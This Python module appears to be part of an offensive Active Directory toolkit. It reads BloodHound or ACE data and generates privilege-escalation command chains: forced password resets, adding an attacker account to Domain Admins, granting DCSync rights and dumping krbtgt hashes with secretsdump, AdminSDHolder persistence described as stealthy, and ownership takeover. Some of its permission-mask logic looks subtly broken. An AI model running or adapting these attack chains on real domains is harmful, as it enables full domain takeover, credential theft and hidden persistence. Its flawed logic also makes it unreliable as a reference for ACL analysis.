"""DACL/SACL abuse module — ACL manipulation for AD privilege escalation.

Identifies and exploits dangerous Access Control Entries (ACEs) in Active
Directory object security descriptors. Covers ownership takeover, AdminSDHolder
abuse, ACL inheritance manipulation, and DCSync rights assignment.

Allows privilege escalation by abusing misconfigured DACLs to grant
DCSync, reset passwords, add group memberships, or modify GPO links.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Optional

ACE_TYPES = {
    "ACCESS_ALLOWED_ACE_TYPE": 0x0,
    "ACCESS_DENIED_ACE_TYPE": 0x1,
    "ACCESS_ALLOWED_OBJECT_ACE_TYPE": 0x5,
    "ACCESS_DENIED_OBJECT_ACE_TYPE": 0x6,
}

ACE_FLAGS = {
    "OBJECT_INHERIT_ACE": 0x1,
    "CONTAINER_INHERIT_ACE": 0x2,
    "NO_PROPAGATE_INHERIT_ACE": 0x4,
    "INHERIT_ONLY_ACE": 0x8,
    "INHERITED_ACE": 0x10,
}

GENERIC_ALL = 0x10000000
GENERIC_WRITE = 0x40000000
WRITE_DACL = 0x00040000
WRITE_OWNER = 0x00080000
EXTENDED_RIGHTS = {
    "DS-Replication-Get-Changes": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "DS-Replication-Get-Changes-All": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "DS-Replication-Get-Changes-In-Filtered-Set": "89e95b76-444d-4c62-991a-0facbeda640c",
    "DS-Replication-Synchronize": "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2",
    "User-Force-Change-Password": "00299570-246d-11d0-a768-00aa006e0529",
    "User-Change-Password": "ab721a53-1e2f-11d0-9819-00aa0040529b",
    "User-Enable-Disable": "2293de02-4bec-4974-9c5e-2092ad554404",
    "Add-GUID": "00000000-0000-0000-0000-000000000000",
    "Member": "bf9679c0-0de6-11d0-a285-00aa003049e2",
}

ABUSE_TECHNIQUES = [
    "ForceChangePassword",
    "AddMember",
    "GenericAll",
    "GenericWrite",
    "WriteDacl",
    "WriteOwner",
    "ReadLAPSPassword",
    "ReadGMSAPassword",
    "AddKeyCredentialLink",
    "AllExtendedRights",
    "DCSync",
    "AddSelf",
    "Self-Membership",
    "SQLAdmin",
]


@dataclass
class ACEntry:
    """A single Access Control Entry in an AD object's DACL/SACL.

    Attributes:
        ace_type: ACCESS_ALLOWED, ACCESS_DENIED, etc.
        trustee_sid: SID of the principal granted the permission.
        access_mask: Bitmask of granted rights.
        flags: Inheritance flags.
        object_type: GUID of the specific attribute right.
        inherited_object_type: GUID for inheritance scoping.
    """

    ace_type: str = ""
    trustee_sid: str = ""
    trustee_name: str = ""
    access_mask: int = 0
    rights: list[str] = field(default_factory=list)
    flags: list[str] = field(default_factory=list)
    object_type: str = ""
    inherited_object_type: str = ""
    is_inherited: bool = False


@dataclass
class ACLTarget:
    """An AD object with exploitable ACEs.

    Attributes:
        distinguished_name: DN in AD.
        sam_account_name: sAMAccountName (or name for non-users).
        object_sid: Security identifier.
        object_type: user, group, computer, gpo, ou, domain.
        interesting_aces: ACEs that grant abuse primitives.
        abuse_techniques: List of applicable abuse techniques.
        severity: critical, high, medium, low.
    """

    distinguished_name: str = ""
    sam_account_name: str = ""
    object_sid: str = ""
    object_type: str = ""
    interesting_aces: list[ACEntry] = field(default_factory=list)
    abuse_techniques: list[str] = field(default_factory=list)
    severity: str = "medium"


class DACLAbuseEngine:
    """Identify and exploit dangerous DACL/SACL entries on AD objects.

    Analyzes BloodHound or LDAP ACL data to find exploitable permission
    paths and generates exploitation plans for each abuse primitive.

    Attributes:
        domain: Target domain FQDN.
        domain_sid: Domain SID.
        acl_data: Raw ACL data from BloodHound or LDAP.
        targets: Discovered exploitable ACL targets.
        attack_chains: Generated attack chains.
    """

    DANGEROUS_RIGHTS = {
        GENERIC_ALL: "GenericAll",
        GENERIC_WRITE: "GenericWrite",
        WRITE_DACL: "WriteDacl",
        WRITE_OWNER: "WriteOwner",
        0x10000: "ExtendedRight",
        0x40: "ReadProperty",
    }

    def __init__(self, domain: str = "", domain_sid: str = "", acl_data: list[dict[str, Any]] = None):
        self.domain = domain
        self.domain_sid = domain_sid
        self.acl_data = acl_data or []
        self.targets: list[ACLTarget] = []
        self.attack_chains: list[dict[str, Any]] = []

    def parse_bloodhound_acls(self, edges: list[dict[str, Any]]) -> list[ACLTarget]:
        """Parse BloodHound edge data to extract exploitable ACLs.

        Args:
            edges: List of BloodHound edge dicts with ACL data.

        Returns:
            List of ACLTarget objects.
        """
        self.targets = []
        target_map: dict[str, ACLTarget] = {}

        for edge in edges:
            if edge.get("label", "") not in ABUSE_TECHNIQUES and edge.get("type") not in ABUSE_TECHNIQUES:
                continue

            dn = edge.get("target", edge.get("to", ""))
            if dn not in target_map:
                target_map[dn] = ACLTarget(
                    distinguished_name=dn,
                    object_type=self._guess_object_type(dn),
                )

            ace = ACEntry(
                ace_type=edge.get("label", edge.get("type", "")),
                trustee_sid=edge.get("source_sid", edge.get("from", "")),
                access_mask=GENERIC_ALL,
                rights=[edge.get("label", "")],
            )
            target_map[dn].interesting_aces.append(ace)
            target_map[dn].abuse_techniques.append(edge.get("label", ""))

        for target in target_map.values():
            target.abuse_techniques = list(set(target.abuse_techniques))
            target.severity = self._calculate_severity(target)

        self.targets = list(target_map.values())
        return self.targets

    def parse_raw_aces(self, raw_nthashes: list[dict[str, Any]]) -> list[ACLTarget]:
        """Parse raw ACE data from ntSecurityDescriptor parsing.

        Args:
            raw_nthashes: List of dicts with object DN and ACE list.

        Returns:
            List of ACLTarget objects.
        """
        self.targets = []
        for obj in raw_nthashes:
            dn = obj.get("distinguishedname", obj.get("dn", ""))
            aces_raw = obj.get("nTSecurityDescriptor", obj.get("aces", []))

            target = ACLTarget(
                distinguished_name=dn,
                sam_account_name=obj.get("samaccountname", ""),
                object_sid=obj.get("objectsid", ""),
                object_type=self._guess_object_type(dn),
            )

            if isinstance(aces_raw, list):
                for ace_raw in aces_raw:
                    ace = ACEntry(
                        ace_type=ace_raw.get("AceType", ""),
                        trustee_sid=ace_raw.get("SID", ""),
                        access_mask=ace_raw.get("AccessMask", 0),
                        flags=ace_raw.get("AceFlags", []),
                    )
                    if self._is_dangerous_ace(ace):
                        target.interesting_aces.append(ace)
                        target.abuse_techniques.append(
                            self.DANGEROUS_RIGHTS.get(ace.access_mask & 0xFF000000, "Unknown")
                        )

            if target.interesting_aces:
                target.abuse_techniques = list(set(target.abuse_techniques))
                target.severity = self._calculate_severity(target)
                self.targets.append(target)

        return self.targets

    def compute_attack_chains(self) -> list[dict[str, Any]]:
        """Generate exploitation plans for all discovered ACL targets.

        Returns:
            List of attack chain dicts with commands and prerequisites.
        """
        self.attack_chains = []

        for target in self.targets:
            dn = target.distinguished_name
            obj_type = target.object_type
            sam = target.sam_account_name or self._extract_cn(dn)

            abuse_commands: dict[str, list[str]] = {
                "ForceChangePassword": [
                    f"Set-DomainUserPassword -Identity '{sam}' -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) -Credential $cred",
                    f"net user {sam} NewP@ssw0rd! /domain",
                ],
                "AddMember": [
                    f"Add-DomainGroupMember -Identity '{sam}' -Members 'ATTACKER_USER' -Credential $cred",
                    f"net group \"{sam}\" ATTACKER_USER /add /domain",
                ],
                "GenericAll": [
                    f"Set-DomainUserPassword -Identity '{sam}' -AccountPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)",
                    f"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'ATTACKER_USER'",
                ],
                "GenericWrite": [
                    f"Set-DomainObject -Identity '{sam}' -Set @{{serviceprincipalname='nonexistent/BOGUS'}}",
                    f"Execute targeted Kerberoast on {sam}",
                ],
                "WriteDacl": [
                    f"Add-DomainObjectAcl -TargetIdentity '{dn}' -PrincipalIdentity 'ATTACKER_USER' -Rights DCSync",
                    f"secretsdump.py {self.domain}/ATTACKER_USER@DC_IP -just-dc-user krbtgt",
                ],
                "WriteOwner": [
                    f"Set-DomainObjectOwner -Identity '{dn}' -OwnerIdentity 'ATTACKER_USER'",
                    f"Add-DomainObjectAcl -TargetIdentity '{dn}' -PrincipalIdentity 'ATTACKER_USER' -Rights All",
                ],
                "ReadLAPSPassword": [
                    f"Get-DomainObject -Identity '{sam}' -Properties ms-Mcs-AdmPwd",
                    f"Read LAPS password for local admin on {sam}",
                ],
                "DCSync": [
                    f"secretsdump.py {self.domain}/ATTACKER_USER@DC_IP",
                    f"DCSync all hashes from domain controller",
                ],
                "AddKeyCredentialLink": [
                    f"Whisker.exe add /target:{sam} /domain:{self.domain}",
                    f"Rubeus.exe asktgt /user:{sam} /certificate:MII... /password:password /ptt",
                ],
            }

            for technique in target.abuse_techniques:
                cmds = abuse_commands.get(technique, [f"Exploit {technique} on {dn}"])
                self.attack_chains.append({
                    "target": dn,
                    "sam_name": sam,
                    "object_type": obj_type,
                    "technique": technique,
                    "severity": target.severity,
                    "commands": cmds,
                })

        return self.attack_chains

    def adminsdholder_abuse_plan(self, target_sid: str) -> dict[str, Any]:
        """Generate an AdminSDHolder abuse plan.

        AdminSDHolder's ACL is propagated every 60 minutes to all protected
        groups. Modifying its DACL is a stealthy persistence technique.

        Args:
            target_sid: SID of the attacker-controlled account.

        Returns:
            Dict with abuse instructions and commands.
        """
        return {
            "technique": "AdminSDHolderAbuse",
            "target": f"CN=AdminSDHolder,CN=System,DC={self.domain.replace('.', ',DC=')}",
            "description": "Add GenericAll ACE on AdminSDHolder to propagate to Domain Admins hourly",
            "commands": [
                f"Add-DomainObjectAcl -TargetIdentity 'AdminSDHolder' -PrincipalIdentity '{target_sid}' -Rights All",
                "Wait 60 minutes for SDProp to propagate",
                "Add attacker to Domain Admins after propagation",
                "SDProp runs every 60 minutes on the PDC emulator",
            ],
            "cleanup": [
                "Remove-ADObjectAcl -TargetIdentity 'AdminSDHolder' -PrincipalIdentity ATTACKER -Rights All",
            ],
        }

    def dcsync_rights_assignment_plan(self, target_sid: str, domain_dn: str = "") -> dict[str, Any]:
        """Generate a DCSync rights assignment plan.

        Grants DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
        extended rights to an attacker-controlled account on the domain root.

        Args:
            target_sid: SID to grant DCSync rights to.
            domain_dn: Domain distinguished name.

        Returns:
            Dict with DCSync assignment commands.
        """
        return {
            "technique": "DCSyncRightsAssignment",
            "target": domain_dn or f"DC={self.domain.replace('.', ',DC=')}",
            "description": "Grant DCSync privileges to attacker-controlled account",
            "extended_rights": [
                "DS-Replication-Get-Changes",
                "DS-Replication-Get-Changes-All",
            ],
            "commands": [
                f"Add-DomainObjectAcl -TargetIdentity '{domain_dn}' -PrincipalIdentity '{target_sid}' -Rights DCSync",
                f"secretsdump.py {self.domain}/{target_sid}@DC_IP -just-dc-user krbtgt",
            ],
            "verify_command": [
                f"Get-DomainObjectAcl -Identity '{domain_dn}' -ResolveGUIDs | ?{{$_.SecurityIdentifier -eq '{target_sid}'}}",
            ],
        }

    def owner_takeover_plan(self, target_dn: str, attacker_sid: str) -> dict[str, Any]:
        """Generate an ownership takeover plan.

        Changes the owner of an AD object to the attacker, then grants
        WriteDacl to modify permissions.

        Args:
            target_dn: Distinguished name of the target object.
            attacker_sid: Attacker's SID.

        Returns:
            Dict with owner takeover instructions.
        """
        return {
            "technique": "OwnerTakeover",
            "target": target_dn,
            "description": "Take ownership and grant full control of target object",
            "steps": [
                "1. Change ownership to attacker",
                "2. Grant self WriteDacl on the target",
                "3. Grant self GenericAll via the new DACL",
                "4. Execute desired abuse primitive (reset password, add to group, etc.)",
            ],
            "commands": [
                f"Set-DomainObjectOwner -Identity '{target_dn}' -OwnerIdentity '{attacker_sid}'",
                f"Add-DomainObjectAcl -TargetIdentity '{target_dn}' -PrincipalIdentity '{attacker_sid}' -Rights WriteDacl",
                f"Add-DomainObjectAcl -TargetIdentity '{target_dn}' -PrincipalIdentity '{attacker_sid}' -Rights All",
            ],
        }

    @staticmethod
    def _is_dangerous_ace(ace: ACEntry) -> bool:
        high_risk = {GENERIC_ALL, GENERIC_WRITE, WRITE_DACL, WRITE_OWNER}
        return bool(ace.access_mask & sum(high_risk))

    @staticmethod
    def _calculate_severity(target: ACLTarget) -> str:
        techniques = target.abuse_techniques
        if "DCSync" in techniques or "GenericAll" in techniques:
            return "critical"
        if "WriteDacl" in techniques or "WriteOwner" in techniques:
            return "high"
        if "ForceChangePassword" in techniques or "AddMember" in techniques:
            return "high"
        if "GenericWrite" in techniques or "ReadLAPSPassword" in techniques:
            return "medium"
        return "low"

    @staticmethod
    def _guess_object_type(dn: str) -> str:
        dn_upper = dn.upper()
        if "CN=COMPUTERS" in dn_upper or "OU=DOMAIN CONTROLLERS" in dn_upper:
            return "computer"
        if "CN=USERS" in dn_upper or "USER" in dn_upper:
            return "user"
        if "CN=GROUPS" in dn_upper or "GROUP" in dn_upper:
            return "group"
        if "POLICIES" in dn_upper or "GPO" in dn_upper:
            return "gpo"
        if "OU=" in dn_upper:
            return "ou"
        if "DC=" in dn_upper:
            return "domain"
        return "unknown"

    @staticmethod
    def _extract_cn(dn: str) -> str:
        match = re.search(r"CN=([^,]+)", dn)
        return match.group(1) if match else dn

    def summary(self) -> dict[str, Any]:
        """Return a summary of all DACL/SACL abuse findings.

        Returns:
            Dict with target counts by severity, technique counts, and attack chains.
        """
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        technique_counts: dict[str, int] = {}

        for target in self.targets:
            severity_counts[target.severity] = severity_counts.get(target.severity, 0) + 1
            for tech in target.abuse_techniques:
                technique_counts[tech] = technique_counts.get(tech, 0) + 1

        return {
            "total_targets": len(self.targets),
            "by_severity": severity_counts,
            "by_technique": technique_counts,
            "attack_chains": len(self.compute_attack_chains()),
            "top_techniques": sorted(
                technique_counts.items(), key=lambda x: x[1], reverse=True
            )[:10],
        }
